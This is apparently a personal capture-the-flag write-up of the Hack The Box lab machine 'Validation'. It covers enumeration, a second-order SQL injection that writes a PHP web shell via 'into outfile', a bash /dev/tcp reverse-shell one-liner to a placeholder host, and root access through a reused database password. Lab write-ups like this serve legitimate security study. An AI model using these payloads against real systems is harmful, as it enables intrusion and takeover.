---
title: "Validation HTB"
date: 2021-09-24T17:30:30
categories:
  - study
tags:
  - Linux
  - Web
  - SQLi
  - Password Reuse
  - ClearText Credentials
classes: wide
---
Validation is an easy rated retired linux box made by Ippsec for the Ultimate Hacking Championship(UHC) qualifier. 

It can be found [here.](https://app.hackthebox.eu/machines/Validation/)

<h2> Enumeration</h2>
**Nmap scan results:**

```
22/tcp   open     ssh            syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http           syn-ack     Apache httpd 2.4.48 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open     http           syn-ack     nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp           no-response
5001/tcp filtered commplex-link  no-response
5002/tcp filtered rfe            no-response
5003/tcp filtered filemaker      no-response
5004/tcp filtered avt-profile-1  no-response
5005/tcp filtered avt-profile-2  no-response
5006/tcp filtered wsm-server     no-response
5007/tcp filtered wsm-server-ssl no-response
5008/tcp filtered synapsis-edge  no-response
8080/tcp open     http           syn-ack     nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<h4>What is the scan telling us?</h4>

- Port 22 is running the usual ssh, specifically OpenSSH 8.2p1 Ubuntu.
- Port 80 is running an Apache http server, Apache 2.4.48.
- Port 4566, 8080 are running nginx servers?
- Ports 5000-5008 are appearing but are filtered despite the `-Pn` on the Nmap scan.

<h4> Why are these ports filtered?</h4>

0xdf may have provided an explanation on their [blog](https://0xdf.gitlab.io/2021/09/14/htb-validation.html#beyond-root):

>*"I noticed ports 5000-5008 were filtered in my initial nmap scan. These ports are actually different Docker instances of the same exploitable webapp (I think he actually used 5000-5031). Then he has a kernel module that is re-writing incoming packets for TCP 80 based on the source IP to one of the containers, so there’s significantly fewer players interacting with each instance."*

<h4>What is Nginx?</h4>

According to the [official site](https://www.nginx.com), Nginx is an *"open source web server that powers more than 400 million websites"*. It also seems to have features that allow it to be used as a reverse proxy, load balancer, mail proxy and HTTP cache.

**Gobuster:**

```
/index.php (Status: 200)
/account.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/config.php (Status: 200)
/server-status (Status: 403)
```

Navigating to http://10.10.11.116:4566/ , we see 403 forbidden nginx. 
`/config.php` looks interesting but unfortunately returns a blank page.

Navigating to the main site on port 80 we see a username field and a drop down list of countries. The site seems to be asking us to "Register Now" for "Join the UHC - September Qualifiers". 

Inputting strings and clicking "Join Now" leads us to `/account.php` and a list of other usernames that have been entered before. This suggests that this information has been stored.

Accessing `/account.php` from the index directly seems to bring us to the last country we submitted a username to, which suggests a cookie associated with the submission. Deleting the cookie results in the /account.php stage asking us to "Please register!".

Registering to Brazil again and we still see the usernames registered before, confirming the storage of input on the website.

**sqlmap**
```
Parameter: country (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=lVdH&country=Brazil' AND (SELECT 6558 FROM (SELECT(SLEEP(5)))TuOt) AND 'FzfL'='FzfL
---
do you want to exploit this SQL injection? [Y/n] y
[08:49:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.48, PHP 7.4.23
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

Sqlmap lets us know that the backend database is MySQL 5.0.12 and the site is running PHP 7.4.23 and there is clearly some capability for SQLi.

I admit that I don't know much about SQL and SQL injections. Gonna have to read the writeups for foothold.

<h2>Foothold</h2>

It seems that this website and database are vulnerable to something known as a second order SQL injection. [Portswigger](https://portswigger.net/kb/issues/00100210_sql-injection-second-order) describes this as:

>*"Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way."*

We open up **burpsuite** in order to intercept the form.

It seems that when we supply a country and username to the form on the website, we see in burpsuite intercept it looks like:

```
username=test&country=Brazil
```

And then if we add a single quote `'` to the end of Brazil to break the SQL, like so:
```
username=test&country=Brazil'
```

And then forward the request, we get as a response on the `/account.php` page: 

```
Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in 
/var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php on line 33
```
This shows that the site is taking our user-supplied data and then incorporating it into the account.php query, a "Second-order SQL injection". 

So it is possible to write a file into the `/var/www/html` directory, which means we can place a simple php web shell onto the box by way of our burpsuite request with SQL commands: 

```
username=test&country=Brazil' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" into outfile '/var/www/html/rev.php'-- -
```

The initial command `union select` is indicating that we wish to execute additional select queries. The command `into outfile` is explained by the [mysql documentation](https://dev.mysql.com/doc/refman/8.0/en/select-into.html) as:

>*"The SELECT ... INTO OUTFILE 'file_name' form of SELECT writes the selected rows to a file. The file is created on the server host, so you must have the FILE privilege to use this syntax. file_name cannot be an existing file, which among other things prevents files such as /etc/passwd and database tables from being modified."*

So we are saying, whatever is selected in the backend, also select (union select) `"<?php SYSTEM($_REQUEST['cmd']); ?>"` (php webshell code) and put it into a file in `/var/www/html/` called `rev.php`. 

The addition of `-- -` at the end ensures that the command is ended, as anything after the double hyphen and space is a comment.

From here we can navigate to our simple php shell and add commands after `?cmd=` like so:

```
http://10.10.11.116/rev.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data) 
```

Now we have RCE we can setup a reverse shell.

We setup our nc listener, find a bash tcp reverse shell, url encode it and then execute the following in the url:

```
10.10.11.116/rev.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOURIP/YOURPORT+0>%261'
```

We then catch our shell, and have access as `www-data`. We navigate to `/home/htb` and find the userflag.


<h2>Privilege Escalation</h2>

Checking the writeup and it all seems so obvious...

Remember that blank `config.php` we saw in gobuster earlier?

It was blank because we did not have permission to view it.

Now we can read the contents:

```bash
www-data@validation:/var/www/html$ cat config.php
cat /var/www/html/config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>

```

This password conveniently contains the phrase "global-pw", which suggests it is a reused password. We test and it can be used to `su root`. We do this, enter the password and now we have a root shell!

The flag is found in the usual `/root/root.txt`.

<h4>For next time:</h4>

- Learn about SQL, learn how SQL injection works. There's a fun SQL murder mystery from [knight lab](https://mystery.knightlab.com/) that looks cool.
- Remember to enumerate the /www/html directory. Especially for a web box, config.php is a good find and should have been checked immediately. 


